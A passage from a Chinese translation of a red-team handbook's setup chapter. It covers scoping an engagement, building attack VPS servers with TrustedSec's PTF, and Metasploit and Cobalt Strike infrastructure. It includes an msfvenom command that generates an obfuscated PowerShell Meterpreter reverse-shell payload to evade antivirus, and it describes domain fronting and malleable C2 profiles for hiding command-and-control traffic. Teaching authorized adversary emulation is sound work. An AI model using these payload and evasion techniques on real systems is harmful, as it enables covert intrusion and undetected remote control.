被执行，所有的乐趣就从这里开始了!
21
第1章 赛前准备——安装
设定你的行动
这是红队活动中我最喜欢的一部分。在进攻你的第一个系统之前，你需要确定你的红队活动
范围。在很多渗透测试中，你会得到一个目标，然后不断地尝试进入那个单一的系统。如果
某件事情失败了，你就继续做下一件事。没有脚本，你通常非常专注这个网络。
在红队活动中，我们从几个目标开始。这些目标可以包括但不限于:
最终的目标是什么?只是 APT 检测吗?是要在服务器上获取标志吗？是从数据库中获取数
据吗?或者只是为了得到检测时效(TTD)指标?
是否有我们想要复制的公开活动?
你会用什么技巧?我们讨论过用 MITRE ATT&CK 矩阵，但是在每个类别中确切的技术是
什么?
红金丝雀研究小组提供了每一种技术的详细信息。我强烈建议你花点时间来查看这
些详细信息。
客户希望你使用什么工具?是一些诸如 Metasploit、Cobalt Strike、DNS Cat 这样的商业
攻击工具软件？还是自制的定制化工具?
一个好消息是被抓住也是评估的一部分。有一些入侵中我们会被抓4到5次，然后在4到5个不
同的环境中被消灭。这确实向你的客户表明，他们的防御如他们预期的一样在起作用（或没
有起作用）。在书的最后，我将提供一些报告示例，说明我们如何获取指标并报告这些数
据。
设置你的外部服务器
我们使用许多不同的服务来建立我们的红队活动。在当今这个充斥着 VPS的世界里，在互联
网上抵抗攻击者的机器不会超出你的预算。例如，我通常使用 Digital Dcean 公司的 Droplets
计算服务或 AWS 的 Lightsail 服务器来配置我的 VPS 服务器。我使用这些服务的原因是它们
通常成本很低(有时是免费的)，可以选择 Ubuntu 系统的服务器，并且可以根据需要选择购买
不同区域的服务器。最重要的是，它们非常容易设置。在几分钟内，你就可以设置并运行多
个服务器的 Metasploit 和 Empire 服务。
在本书中，我将重点介绍 AWS 的 Lightsail 服务器，因为它易于设置、能够自动化服务，以
及通常流向 AWS 的流量。在你成功创建了一个你喜欢的镜像后，你可以快速地将该镜像克隆
到多个服务器，这使得构建现成的 C2(Command and Control) box 非常容易。
同样，你应该确保遵守 VPS 提供者的服务条款，这样你就不会陷入任何问题。
下面是操作要点：
https://lightsail.aws.amazon.com/
创建一个实例
我强烈建议至少使用1gb内存
22
第1章 赛前准备——安装
硬盘大小一般不会有什么问题，可以随意选择
Linux/Unix
操作系统只选 -> Ubuntu
下载 Cert(证书)
chmod 600 cert(译者注:只有拥有者有读写权限)
ssh -i cert ubuntu@[ip]
搭建服务器的一个快速方法是集成 TrustedSec 公司的渗透测试框架 (PTF)。PTF 框架是一些
脚本的合集，可以为你做大量的艰苦工作并为其他所有内容创建了一个框架。让我们通过一
个快速示例来安装我们所有的漏洞利用模块，信息收集模块，后渗透利用模块，PowerShell
攻击模块和漏洞分析工具：
sudo su -
apt-get update
apt-get install python
git clone https://github.com/trustedsec/ptf /opt/ptf
cd /opt/ptf && ./ptf
use modules/exploitation/install_update_all
use modules/intelligence-gathering/install_update_all
use modules/post-exploitation/install_update_all
use modules/powershell/install_update_all
use modules/vulnerability-analysis/install_update_all
cd /pentest
下图显示了所有的可用模块，其中一些模块是我们自己安装的。
图: 所有可用模块的列表
23
第1章 赛前准备——安装
如果我们查看我们的攻击者 VPS，就可以看到安装在我们的机器上的所有工具。如果我们想
要启动 Metasploit，我们可以输入:msfconsole。
图: 安装在 /pentest 文件夹下的所有工具
我仍然建议建立强大的 IPTables 规则。因为这将是你的攻击服务器，所以最好限制 SSH 身
份验证可以从何处发起， Empire/Meterpreter/Cobalt Strike的 payload 可以从何处发起，以及
你所支持的任何钓鱼页面。
如果你还记得在2016年末，有人发现了未经身份验证的远程代码执行(RCE) (
https://blog.cobaltstrike.com/2016/09/28/cobalt-strike-rce-active-exploitation-reported/ )。你
肯定不希望客户数据受到攻击服务器的损害。
我曾经看到一些红队在 AWS 中，使用 Docker 运行 Kali Linux (或者至少是 Metasploit) (参考:
http://bit.ly/2qz2vN9 )。在我看来，虽然创建你自己的系统怎么样都可以。但是更好的选择是
创建一个高效且可重复的流程来部署多台机器。使用 Lightsail 的 最大好处是一旦你将你的机
器配置为你的首选项，你就可以对一台机器进行快照，并部署使用该镜像的多个全新实例。
如果你想让你的环境更上一层楼，看看 Coalfire 研究所的团队。他们构建了自定义模块来为
你完成所有的艰苦工作和自动化。Red Baron 是 Terraform 的一组模块和自定义/第三方提供
者，它可以为红队自动创建弹性、一次性、安全和灵活的基础设施。无论你想要构建一个钓
鱼服务器，Cobalt Strike 基础设施，或创建 DNS C2 服务器，你都可以用 Terraform 做到这
一切。
查看 https://github.com/Coalfire-Research/Red-Baron 并查看所有不同的模块以便快速构建你
自己的基础架构。
红队的核心工具
红队可能会使用很多工具，但是让我们来讨论些最核心的工具。请记住，作为一个红队成
员，我们的目的不是破坏环境(虽然这是最有趣的)，而是要复制现实世界的攻击，以查看客户
是否受到保护，并可以在很短的时间内检测到攻击。在前面的章节中，我们了解了如何从其
他 APT 组织那里复制攻击者的概要文件和工具集，所以让我们回顾一下一些最常见的红队工
具。
Metasploit 框架
24
第1章 赛前准备——安装
本书不会像前几本书那样深入探讨 Metasploit。尽管 Metasploit 框架最初是从 2003 年开发
的，但它现在仍然是一个非常棒的工具。这是由于最初的开发者 H.D. Moore 和非常活跃的社
区为它提供持续支持。这个社区驱动的框架，似乎每天更新，拥有所有最新的公开漏洞的利
用、后渗透利用模块、辅助模块等等。
对于红队项目，我们可能使用 Metasploit 通过MS17-010永恒之蓝漏洞危害内部系统，以获得
我们的第一个内网 shell,或者我们可能使用 Metasploit 为我们的社会工程攻击生成一个
Meterpreter payload。
在后面的章节中，我将向你展示如何重新编译你的 Metasploit payload 并绕过杀毒软件和网络
监控。
混淆 Meterpreter 的 Payload
如果我们正在针对目标进行一些社工尝试，我们可能会使用 Word 或 Excel 文档作为我们的
payload（攻击载荷）的载体。 但是，一个潜在的问题是我们可能无法包含 Meterpreter 的
payload 的二进制文件或让目标机器从 Web 下载我们的 payload，因为这些操作可能会触发
目标机器中的杀毒软件的警报。 所以，这里给出一个简单的解决方案，使用 PowerShell 进行
模糊处理：
msfvenom -payload windows/x64/meterpreter_reverse_http -format psh -out meterpreter-64
.ps1 LHOST=127.0.0.1
我们甚至可以将混淆提升到新的水平，并使用 Unicorn 等工具生成更多模糊的基于
PowerShell 的 Meterpreter payload，我们将在本书中详细介绍这些混淆器。
此外，使用受信任的机构签发的 SSL/TLS 证书可以帮助我们绕过某些网络中的 IDS（入侵检
测系统），具体可以参考以下链接实现：Meterpreter Paranoid Mode。
最后，在本书的后面部分，我们将讨论如何重新编译利用 Metasploit/Meterpreter 来绕过基于
主机和网络的检测工具。
Cobalt Strike
Cobalt Strike 是迄今为止我最喜欢的红队模拟工具之一。什么是 Cobalt Strike 呢？它是一种
用来后期持久渗透，横向移动，流量隐藏、数据窃取的工具。 Cobalt Strike 并没有直接的漏
洞利用，也没有通过最新的 0-Day 漏洞来破坏系统。当你已经在服务器上执行了 CS 的恶意
25
第1章 赛前准备——安装
代码或者将 CS 用作网络钓鱼活动的一部分时，你就能感受到 CS 的功能是多么广泛并且强
大。 一旦你可以在机器上执行 Cobalt Strike 的 payload，它创建一个 Beacon(远控木马功能)
连接回连到 C2 服务器（teamserver）。
新的 Cobalt Strike 许可证的费用为3500美元(单用户一年)，所以它并不是一个便宜工具。 不
过该软件有免费的限量试用版。
Cobalt Strike 基础设施
正如上文所述，在基础设施方面，我们希望设置这样一个可重用且高度灵活的环境。Cobalt
Strike 支持重定向，当你的 Cobalt Strike 使用的 C2 域名被销毁了，你不需要创建并启用一
个新的环境，只需要替换一个新的 C2 域名。你可以在这里找到更多的使用 socat 配置这些重
定向器的信息：链接1 & 链接2
为了使你更好的重定向，我们可以使用域名前置（域名幌子）。域名前置是使用其他的域名
和基础设施的技术作为控制器重定向的技术集合(参考链接)。这可以通过使用流行的内容分发
网络(CDNs)来实现，如亚马逊云的 CloudFront 或其他的 Google Hosts 来隐蔽我们的流量
源。这在过去曾被不同的攻击者所利用过(参考链接)。
通过使用这些高信誉域名，无论 HTTP 或 HTTPS 的任何流量，看起来都像是它正在与这些
域通信，而不是与我们的恶意 C2 服务器通信。这一切是如何运作的？用一个比较抽象的例子
来说，你的所有流量将被发送到 CloudFront 的一个主要完全限定域名(FQDNs)，例如
a0.awsstatic.com，它是 CloudFront 的主要域名。修改请求中的主机 header 将把所有流量重
定向到我们的 CloudFront 分发(CloudFront distribution)，后者最终会将流量转发到我们的
Cobalt Strike C2服务器上(参考链接)。
26
第1章 赛前准备——安装
通过更改 HTTP 主机的 header，CDN 将很轻松的的的地把流量传输回到正确的服务器。红
队一直使用这种技术通过使用高信誉域名来隐藏 C2 服务器的流量。
另外两个支持域名前置的两个不同公司的优秀资源：
CyberArk 还写了一篇很好的博客文章，在文章里他介绍了如何使用谷歌的应用产品来使
你的流量看起来是流经了 www.google.com, mail.google.com 或者 docs.google.com.
Vincent Yiu 写了一篇关于如何使用阿里巴巴 CDN 来支持自己的域名前置攻击的文章。
Cobalt Strike 不是唯一可以支持域名前置的工具，也可以通过 Meterpreter 来完成(参考
链接)。
注:在本书出版时，AWS(甚至谷歌云)已经启动实现对域名前置的保护(
https://amzn.to/2I6lSry )。这并不能阻止这种类型的攻击，只是需要不同的第三方资源来
进行利用。
尽管不是基础架构的一部分，但是我们还是应该要理解 beacon 是如何在内部环境中工作的。
在操作安全方面，我们应该避免建立会被轻易发现并清除的持久连接。作为一名红队成员，
我们必须假设我们的一些客户端是会被蓝队发现的。如果我们让所有的主机都与一个或两个
C2 服务器通信，蓝队很容易就可以把整个基础设施连根拔除。幸运的是，Cobalt Strike 支持
内网主机之间使用基于 SMB 的 Beacon 来进行交互。这允许你让一台受感染的计算机与你的
C2 服务器进行正常且合适的 beacon 连接，并使内部网络上的所有其他的服务器通过 SMB
协议与最初受感染的主机进行通信。采用这种连接方式，当蓝队检测到一个二级系统有问题
并进行取证分析，他们可能会无法识别与这次攻击相关的 C2 服务器域名。
27
第1章 赛前准备——安装
Cobalt Strike 可以操纵你的 Beacon 通信，这对红队成员来说是一个非常有用的特性。使用
自定义 C2 配置文件，你可以让所有来自受感染主机系统的流量看起来和普通流量无异。现在
我们会发现越来越多的内网环境中会针对第7层网络应用层进行过滤。很多时候蓝队在这层中
找寻那些网络通信中的异常流量，那么我们怎样才能让我们的C2通信变得如同正常的 Web 流
量呢？这就是可定制 C2 配置文件发挥作用的地方。看看这个例子。阅读这个例子，你会看到